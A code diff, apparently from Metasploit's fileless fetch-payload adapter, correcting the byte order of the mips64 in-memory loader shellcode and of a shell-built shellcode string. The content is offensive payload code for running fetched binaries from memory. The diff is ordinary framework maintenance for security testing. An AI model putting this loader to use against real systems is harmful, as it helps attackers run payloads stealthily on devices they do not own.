@@ -100,15 +100,15 @@ module Msf::Payload::Adapter::Fetch::Fileless
       payload = in_memory_loader_asm.pack("V*")
     when 'mips64'
       in_memory_loader_asm = [
-          0x2520a003, #0x1000:	move	$a0, $sp	0x2520a003
-          0x01000524, #0x1004:	addiu	$a1, $zero, 1	0x01000524
-          0xc2140224, #0x1008:	addiu	$v0, $zero, 0x14c2	0xc2140224
-          0x0c010101, #0x100c:	syscall	0x40404	0x0c010101
-          0x2520e003, #0x1010:	move	$a0, $ra	0x2520e003
-          0xd3130224, #0x1014:	addiu	$v0, $zero, 0x13d3	0xd3130224
-          0x0c010101, #0x1018:	syscall	0x40404	0x0c010101
-          0xa9130224, #0x101c:	addiu	$v0, $zero, 0x13a9	0xa9130224
-          0x0c010101, #0x1020:	syscall	0x40404	0x0c010101
+        0x03a02025, #0x1000:	move	$a0, $sp	0x03a02025
+        0x24050001, #0x1004:	addiu	$a1, $zero, 1	0x24050001
+        0x240214c2, #0x1008:	addiu	$v0, $zero, 0x14c2	0x240214c2
+        0x0101010c, #0x100c:	syscall	0x40404	0x0101010c
+        0x03e02025, #0x1010:	move	$a0, $ra	0x03e02025
+        0x240213d3, #0x1014:	addiu	$v0, $zero, 0x13d3	0x240213d3
+        0x0101010c, #0x1018:	syscall	0x40404	0x0101010c
+        0x240213a9, #0x101c:	addiu	$v0, $zero, 0x13a9	0x240213a9
+        0x0101010c, #0x1020:	syscall	0x40404	0x0101010c
       ]
       payload = in_memory_loader_asm.pack('N*')
     when 'mipsbe'
@@ -244,7 +244,7 @@ module Msf::Payload::Adapter::Fetch::Fileless
     # ld	$t2, 16($ra)
     # jr $t2
     when 'mips64'
-      %^"00001104000000002670ce011000eedf0800c00100000000"$(echo $(printf %016x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')^
+      %^"041100000000000001ce7026dfee001001c0000800000000"$(echo $(printf %016x $vdso_addr))^
     
     # PPC shellcode
     # bl 4
